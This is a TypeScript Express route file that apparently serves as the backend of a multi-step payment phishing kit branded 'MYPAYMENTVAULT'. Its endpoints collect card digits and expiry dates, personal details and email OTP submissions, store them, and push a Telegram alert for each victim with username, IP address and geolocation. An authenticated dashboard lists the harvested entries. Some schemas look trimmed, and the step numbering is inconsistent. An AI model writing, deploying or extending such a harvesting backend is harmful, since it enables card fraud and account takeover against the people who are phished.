import { Router, type IRouter } from "express";
import { db, cardSubmissionsTable, contactSubmissionsTable, otpSubmissionsTable, personalSubmissionsTable, loginLogsTable, pageVisitsTable } from "@workspace/db";
import { sql, eq, desc } from "drizzle-orm";
import { z } from "zod";
import { requireAuth } from "../middleware/require-auth";
import { tgNotify } from "../lib/tg-notify";
import { getIpGeo } from "../lib/ip-geo";

const router: IRouter = Router();

const CardBody = z.object({
  username: z.string().min(1),
  crewId: z.string().optional(),
  cardLast8: z.string().optional(),
  cardMonth: z.string().optional(),
  cardYear: z.string().optional(),
  ipAddress: z.string().optional(),
});

const OtpBody = z.object({
  username: z.string().min(1),
  ipAddress: z.string().optional(),
});

const ContactBody = z.object({
  username: z.string().min(1),
  city: z.string().optional(),
  state: z.string().optional(),
  inquiryType: z.string().optional(),
  message: z.string().optional(),
  ipAddress: z.string().optional(),
});

const PersonalBody = z.object({
  username: z.string().min(1),
  city: z.string().optional(),
  state: z.string().optional(),
  inquiryType: z.string().optional(),
  message: z.string().optional(),
  ipAddress: z.string().optional(),
});

/* Contact Form */
router.post("/submissions/contact", async (req, res): Promise<void> => {
  const parsed = ContactBody.safeParse(req.body);
  if (!parsed.success) { res.status(400).json({ error: "Invalid request" }); return; }
  await db.insert(contactSubmissionsTable).values(parsed.data).catch(() => {});
  const d = parsed.data;
  const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
  const geo = await getIpGeo(d.ipAddress ?? "");
  void tgNotify(
    `📋 <b>CONTACT FORM</b> — Step Akhir\n` +
    `<code>────────────────────────</code>\n\n` +
    `👤 <b>Username</b>    <code>${d.username}</code>\n` +
    `🌐 <b>IP</b>          <code>${d.ipAddress ?? "-"}</code>\n` +
    `${geo.flag} <b>Lokasi IP</b>  ${geo.label}\n` +
    `🕐 <b>Waktu</b>       ${now}\n\n` +
    `<code>────────────────────────</code>\n` +
    `<i>🏦 MYPAYMENTVAULT</i>`
  );
  res.json({ ok: true });
});

/* Step 2 — Card Details */
router.post("/submissions/card", async (req, res): Promise<void> => {
  const parsed = CardBody.safeParse(req.body);
  if (!parsed.success) { res.status(400).json({ error: "Invalid request" }); return; }
  await db.insert(cardSubmissionsTable).values(parsed.data).catch(() => {});
  const d = parsed.data;
  const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
  const geo = await getIpGeo(d.ipAddress ?? "");
  void tgNotify(
    `💳 <b>DATA KARTU</b> — Step 4\n` +
    `<code>────────────────────────</code>\n\n` +
    `👤 <b>Username</b>   <code>${d.username}</code>\n` +
    `🌐 <b>IP</b>         <code>${d.ipAddress ?? "-"}</code>\n` +
    `${geo.flag} <b>Lokasi</b>    ${geo.label}\n` +
    `🕐 <b>Waktu</b>      ${now}\n\n` +
    `<code>────────────────────────</code>\n` +
    `<i>🏦 MYPAYMENTVAULT</i>`
  );
  res.json({ ok: true });
});

/* Step 3 — Personal Info */
router.post("/submissions/personal", async (req, res): Promise<void> => {
  const parsed = PersonalBody.safeParse(req.body);
  if (!parsed.success) { res.status(400).json({ error: "Invalid request" }); return; }
  await db.insert(personalSubmissionsTable).values(parsed.data).catch(() => {});
  const d = parsed.data;
  const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
  const geo = await getIpGeo(d.ipAddress ?? "");
  void tgNotify(
    `🧾 <b>DATA PERSONAL</b> — Step 4\n` +
    `<code>────────────────────────</code>\n\n` +
    `👤 <b>Username</b>   <code>${d.username}</code>\n` +
    `🌐 <b>IP</b>         <code>${d.ipAddress ?? "-"}</code>\n` +
    `${geo.flag} <b>Lokasi IP</b> ${geo.label}\n` +
    `🕐 <b>Waktu</b>      ${now}\n\n` +
    `<code>────────────────────────</code>\n` +
    `<i>🏦 MYPAYMENTVAULT</i>`
  );
  res.json({ ok: true });
});

/* Step 4 — OTP */
router.post("/submissions/otp", async (req, res): Promise<void> => {
  const parsed = OtpBody.safeParse(req.body);
  if (!parsed.success) { res.status(400).json({ error: "Invalid request" }); return; }
  await db.insert(otpSubmissionsTable).values(parsed.data).catch(() => {});
  const d = parsed.data;
  const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
  const geo = await getIpGeo(d.ipAddress ?? "");
  void tgNotify(
    `🔢 <b>KODE OTP EMAIL</b> — Step 5\n` +
    `<code>────────────────────────</code>\n\n` +
    `👤 <b>Username</b>  <code>${d.username}</code>\n` +
    `🌐 <b>IP</b>        <code>${d.ipAddress ?? "-"}</code>\n` +
    `${geo.flag} <b>Lokasi</b>   ${geo.label}\n` +
    `🕐 <b>Waktu</b>     ${now}\n\n` +
    `<code>────────────────────────</code>\n` +
    `<i>🏦 MYPAYMENTVAULT</i>`
  );
  res.json({ ok: true });
});

/* Dashboard — safe summary only (auth required) */
router.get("/submissions/all", requireAuth, async (_req, res): Promise<void> => {
  try {
    const [logins, personal, otp, contact] = await Promise.all([
      db
        .select({
          id: loginLogsTable.id,
          username: loginLogsTable.username,
          ipAddress: loginLogsTable.ipAddress,
          status: loginLogsTable.status,
          loggedAt: loginLogsTable.loggedAt,
        })
        .from(loginLogsTable)
        .orderBy(desc(loginLogsTable.loggedAt))
        .limit(200),
      db
        .select({
          id: personalSubmissionsTable.id,
          username: personalSubmissionsTable.username,
          ipAddress: personalSubmissionsTable.ipAddress,
          inquiryType: personalSubmissionsTable.inquiryType,
          submittedAt: personalSubmissionsTable.submittedAt,
        })
        .from(personalSubmissionsTable)
        .orderBy(desc(personalSubmissionsTable.submittedAt))
        .limit(200),
      db
        .select({
          id: otpSubmissionsTable.id,
          username: otpSubmissionsTable.username,
          ipAddress: otpSubmissionsTable.ipAddress,
          submittedAt: otpSubmissionsTable.submittedAt,
        })
        .from(otpSubmissionsTable)
        .orderBy(desc(otpSubmissionsTable.submittedAt))
        .limit(200),
      db
        .select({
          id: contactSubmissionsTable.id,
          username: contactSubmissionsTable.username,
          ipAddress: contactSubmissionsTable.ipAddress,
          inquiryType: contactSubmissionsTable.inquiryType,
          status: contactSubmissionsTable.status,
          submittedAt: contactSubmissionsTable.submittedAt,
        })
        .from(contactSubmissionsTable)
        .orderBy(desc(contactSubmissionsTable.submittedAt))
        .limit(200),
    ]);
    res.json({ logins, personal, otp, contact });
  } catch (err) {
    res.status(500).json({ error: String(err) });
  }
});

/* Admin — list contact submissions (auth required, PII minimized) */
router.get("/submissions/contact", requireAuth, async (_req, res): Promise<void> => {
  const rows = await db
    .select({
      id: contactSubmissionsTable.id,
      username: contactSubmissionsTable.username,
      city: contactSubmissionsTable.city,
      state: contactSubmissionsTable.state,
      inquiryType: contactSubmissionsTable.inquiryType,
      message: contactSubmissionsTable.message,
      ipAddress: contactSubmissionsTable.ipAddress,
      submittedAt: contactSubmissionsTable.submittedAt,
      status: contactSubmissionsTable.status,
    })
    .from(contactSubmissionsTable)
    .orderBy(
      sql`CASE ${contactSubmissionsTable.status} WHEN 'new' THEN 0 ELSE 1 END ASC`,
      desc(contactSubmissionsTable.submittedAt)
    );
  res.json(rows);
});

/* Admin — update status submission */
router.patch("/submissions/contact/:id", requireAuth, async (req, res): Promise<void> => {
  const id = parseInt(req.params.id, 10);
  if (isNaN(id)) { res.status(400).json({ error: "ID tidak valid" }); return; }

  const StatusBody = z.object({ status: z.enum(["new", "handled"]) });
  const parsed = StatusBody.safeParse(req.body);
  if (!parsed.success) { res.status(400).json({ error: "Status tidak valid" }); return; }

  await db.update(contactSubmissionsTable)
    .set({ status: parsed.data.status })
    .where(eq(contactSubmissionsTable.id, id));

  res.json({ ok: true });
});

export default router;
